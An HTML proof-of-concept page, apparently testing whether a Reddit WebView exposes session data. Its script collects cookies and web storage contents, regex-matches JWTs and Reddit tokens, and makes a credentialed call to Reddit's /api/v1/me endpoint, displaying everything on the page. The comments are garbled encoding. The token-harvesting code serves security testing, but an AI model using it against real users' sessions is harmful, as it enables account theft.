<!DOCTYPE html>
<html>
<head>
    <title>Reddit WebView æ•°æ®è¯»å–æµ‹è¯•</title>
    <style>
        body { font-family: monospace; padding: 20px; }
        .section { border: 1px solid #ccc; margin: 10px 0; padding: 10px; }
        .critical { background: #ffcccc; }
        .key { color: blue; font-weight: bold; }
        .value { color: green; word-break: break-all; }
    </style>
</head>
<body>
    <h2>Reddit WebView æ•æ„Ÿæ•°æ®æ£€æµ‹</h2>
    <div id="results"></div>
    
    <script>
    const output = [];
    
    function addSection(title, content, critical = false) {
        const className = critical ? 'section critical' : 'section';
        output.push(`<div class="${className}"><h3>${title}</h3>${content}</div>`);
    }
    
    // 1. æ‰€æœ‰ Cookiesï¼ˆæœ€é‡è¦ï¼ï¼‰
    let cookieContent = '';
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
        const [key, value] = cookie.trim().split('=');
        const isSensitive = /token|auth|session|reddit|bearer|access/i.test(key);
        cookieContent += `<div class="${isSensitive ? 'critical' : ''}">
            <span class="key">${key}:</span> 
            <span class="value">${value || '(empty)'}</span>
        </div>`;
    });
    addSection('ğŸ”´ Cookies (Authentication Tokens)', cookieContent || 'æ—  cookies', true);
    
    // 2. LocalStorage - æŸ¥æ‰¾æ•æ„Ÿé”®
    let localContent = '';
    const sensitivePatterns = /token|auth|user|session|reddit|bearer|access|refresh|jwt/i;
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        const isSensitive = sensitivePatterns.test(key) || sensitivePatterns.test(value);
        
        localContent += `<div class="${isSensitive ? 'critical' : ''}">
            <span class="key">${key}:</span><br>
            <span class="value">${value?.substring(0, 500)}${value?.length > 500 ? '...' : ''}</span>
        </div>`;
    }
    addSection('ğŸŸ¡ LocalStorage', localContent || 'æ— æ•°æ®', false);
    
    // 3. SessionStorage
    let sessionContent = '';
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        const isSensitive = sensitivePatterns.test(key);
        
        sessionContent += `<div class="${isSensitive ? 'critical' : ''}">
            <span class="key">${key}:</span><br>
            <span class="value">${value?.substring(0, 500)}</span>
        </div>`;
    }
    addSection('ğŸŸ¡ SessionStorage', sessionContent || 'æ— æ•°æ®', false);
    
    // 4. IndexedDB æ•°æ®åº“åˆ—è¡¨
    indexedDB.databases().then(dbs => {
        let dbContent = `å‘ç° ${dbs.length} ä¸ªæ•°æ®åº“:<br>`;
        dbs.forEach(db => {
            dbContent += `<div>- <span class="key">${db.name}</span> (ç‰ˆæœ¬ ${db.version})</div>`;
        });
        addSection('ğŸŸ  IndexedDB', dbContent, dbs.length > 0);
        updateDisplay();
    }).catch(e => {
        addSection('ğŸŸ  IndexedDB', `æ— æ³•è®¿é—®: ${e.message}`, false);
        updateDisplay();
    });
    
    // 5. æ£€æŸ¥ç‰¹å®šçš„ Reddit API endpoints å¯è®¿é—®æ€§
    const apiTests = [
        'https://oauth.reddit.com/api/v1/me',
        'https://www.reddit.com/api/me.json'
    ];
    
    let apiContent = 'æ­£åœ¨æµ‹è¯• API è®¿é—®...<br>';
    addSection('ğŸ”´ Reddit API è®¿é—®æµ‹è¯•', apiContent, true);
    
    // 6. å°è¯•è¯»å– Cache Storage
    if ('caches' in window) {
        caches.keys().then(cacheNames => {
            let cacheContent = `å‘ç° ${cacheNames.length} ä¸ªç¼“å­˜:<br>`;
            cacheNames.forEach(name => {
                cacheContent += `<div>- <span class="key">${name}</span></div>`;
            });
            addSection('ğŸŸ  Cache Storage', cacheContent, cacheNames.length > 0);
            updateDisplay();
        });
    }
    
    // 7. æ£€æŸ¥å¯èƒ½çš„ Reddit token æ ¼å¼
    function findTokens() {
        let findings = '';
        const allData = [];
        
        // æ”¶é›†æ‰€æœ‰æ•°æ®
        for (let i = 0; i < localStorage.length; i++) {
            allData.push(localStorage.getItem(localStorage.key(i)));
        }
        allData.push(document.cookie);
        
        // æŸ¥æ‰¾ JWT tokens (æ ¼å¼: xxx.yyy.zzz)
        const jwtPattern = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
        
        // æŸ¥æ‰¾å¯èƒ½çš„ Reddit tokens
        const redditPattern = /[0-9]+-[A-Za-z0-9_-]{20,}/g;
        
        allData.forEach(data => {
            if (data) {
                const jwtMatches = data.match(jwtPattern);
                const redditMatches = data.match(redditPattern);
                
                if (jwtMatches) {
                    findings += '<div class="critical">ğŸ”´ å‘ç° JWT Token:<br>' + 
                               `<span class="value">${jwtMatches[0]}</span></div>`;
                }
                if (redditMatches) {
                    findings += '<div class="critical">ğŸ”´ å‘ç°ç–‘ä¼¼ Reddit Token:<br>' + 
                               `<span class="value">${redditMatches[0]}</span></div>`;
                }
            }
        });
        
        return findings || 'æœªå‘ç°æ˜æ˜¾çš„ token æ ¼å¼';
    }
    
    addSection('ğŸ”´ Token æ¨¡å¼åŒ¹é…', findTokens(), true);
    
    // 8. æµ‹è¯•èƒ½å¦å‘èµ·è®¤è¯è¯·æ±‚
    async function testAuthenticatedRequest() {
        try {
            const response = await fetch('https://oauth.reddit.com/api/v1/me', {
                credentials: 'include' // è‡ªåŠ¨å¸¦ä¸Š cookies
            });
            
            if (response.ok) {
                const data = await response.json();
                return `<div class="critical">âš ï¸ æˆåŠŸè®¿é—®ç”¨æˆ·ä¿¡æ¯ï¼<br>
                        ç”¨æˆ·å: ${data.name}<br>
                        ID: ${data.id}</div>`;
            } else {
                return `HTTP ${response.status} - ${response.statusText}`;
            }
        } catch (e) {
            return `è¯·æ±‚å¤±è´¥: ${e.message}`;
        }
    }
    
    testAuthenticatedRequest().then(result => {
        addSection('ğŸ”´ è®¤è¯ API è°ƒç”¨æµ‹è¯•', result, result.includes('æˆåŠŸ'));
        updateDisplay();
    });
    
    function updateDisplay() {
        document.getElementById('results').innerHTML = output.join('');
    }
    
    updateDisplay();
    </script>
</body>
</html>
